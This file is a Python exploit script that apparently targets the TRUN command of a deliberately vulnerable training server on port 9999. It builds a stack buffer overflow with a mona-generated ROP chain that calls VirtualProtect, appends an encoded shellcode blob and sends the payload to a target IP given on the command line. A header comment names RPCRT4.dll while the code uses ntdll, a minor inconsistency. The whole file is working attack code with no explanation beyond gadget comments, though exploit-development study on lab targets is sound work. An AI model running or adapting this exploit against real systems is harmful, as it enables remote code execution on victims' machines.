#!/usr/bin/env python3

'''

Exploit with the knowledge of base address of RPCRT4.dll


'''

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

base = 0x77100000   # base of ntdll.dll on your victim machine

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        base + 0xe7a5a,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        base + 0x6c7f2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x3e866,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebx:---]
        base + 0xe28aa,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x74a1a301,  # put delta into eax (-> put 0x00000201 into ebx)
        base + 0x42002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0xd3ea9,  # XCHG EAX,EBX # OR EAX,E58BFFFA # POP EBP # RETN 0x08 [ntdll.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (compensate)
        #[---INFO:gadgets_to_set_edx:---]
        base + 0x70173,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x74a1a140,  # put delta into eax (-> put 0x00000040 into edx)
        base + 0x42002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x1b6e2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        base + 0xd74b6,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x125c9f,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        base + 0x7a182,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x36205,  # RETN (ROP NOP) [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebp:---]
        base + 0x77cbf,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x8b903,  # & call esp [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        base + 0x1118d4,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        base + 0x194f1,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

SHELL =  b""
SHELL += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
SHELL += b"\x81\x76\x0e\x8f\xb3\xc9\x42\x83\xee\xfc\xe2\xf4"
SHELL += b"\x73\x5b\x4b\x42\x8f\xb3\xa9\xcb\x6a\x82\x09\x26"
SHELL += b"\x04\xe3\xf9\xc9\xdd\xbf\x42\x10\x9b\x38\xbb\x6a"
SHELL += b"\x80\x04\x83\x64\xbe\x4c\x65\x7e\xee\xcf\xcb\x6e"
SHELL += b"\xaf\x72\x06\x4f\x8e\x74\x2b\xb0\xdd\xe4\x42\x10"
SHELL += b"\x9f\x38\x83\x7e\x04\xff\xd8\x3a\x6c\xfb\xc8\x93"
SHELL += b"\xde\x38\x90\x62\x8e\x60\x42\x0b\x97\x50\xf3\x0b"
SHELL += b"\x04\x87\x42\x43\x59\x82\x36\xee\x4e\x7c\xc4\x43"
SHELL += b"\x48\x8b\x29\x37\x79\xb0\xb4\xba\xb4\xce\xed\x37"
SHELL += b"\x6b\xeb\x42\x1a\xab\xb2\x1a\x24\x04\xbf\x82\xc9"
SHELL += b"\xd7\xaf\xc8\x91\x04\xb7\x42\x43\x5f\x3a\x8d\x66"
SHELL += b"\xab\xe8\x92\x23\xd6\xe9\x98\xbd\x6f\xec\x96\x18"
SHELL += b"\x04\xa1\x22\xcf\xd2\xdb\xfa\x70\x8f\xb3\xa1\x35"
SHELL += b"\xfc\x81\x96\x16\xe7\xff\xbe\x64\x88\x4c\x1c\xfa"
SHELL += b"\x1f\xb2\xc9\x42\xa6\x77\x9d\x12\xe7\x9a\x49\x29"
SHELL += b"\x8f\x4c\x1c\x12\xdf\xe3\x99\x02\xdf\xf3\x99\x2a"
SHELL += b"\x65\xbc\x16\xa2\x70\x66\x5e\x28\x8a\xdb\xc3\x42"
SHELL += b"\x8d\xbc\xa1\x40\x8f\xac\x59\xcb\x69\xd9\xd9\x14"
SHELL += b"\xd8\xdb\x50\xe7\xfb\xd2\x36\x97\x0a\x73\xbd\x4e"
SHELL += b"\x70\xfd\xc1\x37\x63\xdb\x39\xf7\x2d\xe5\x36\x97"
SHELL += b"\xe7\xd0\xa4\x26\x8f\x3a\x2a\x15\xd8\xe4\xf8\xb4"
SHELL += b"\xe5\xa1\x90\x14\x6d\x4e\xaf\x85\xcb\x97\xf5\x43"
SHELL += b"\x8e\x3e\x8d\x66\x9f\x75\xc9\x06\xdb\xe3\x9f\x14"
SHELL += b"\xd9\xf5\x9f\x0c\xd9\xe5\x9a\x14\xe7\xca\x05\x7d"
SHELL += b"\x09\x4c\x1c\xcb\x6f\xfd\x9f\x04\x70\x83\xa1\x4a"
SHELL += b"\x08\xae\xa9\xbd\x5a\x08\x29\x5f\xa5\xb9\xa1\xe4"
SHELL += b"\x1a\x0e\x54\xbd\x5a\x8f\xcf\x3e\x85\x33\x32\xa2"
SHELL += b"\xfa\xb6\x72\x05\x9c\xc1\xa6\x28\x8f\xe0\x36\x97"

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 1995 +
    # 0x6250129D Address of RETN
    struct.pack('<L', 0x6250129D) +
    create_rop_chain() +
    # Align stack
    b'\x83\xE4\xF0' +   # and esp, 0xfffffff0
    SHELL +
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)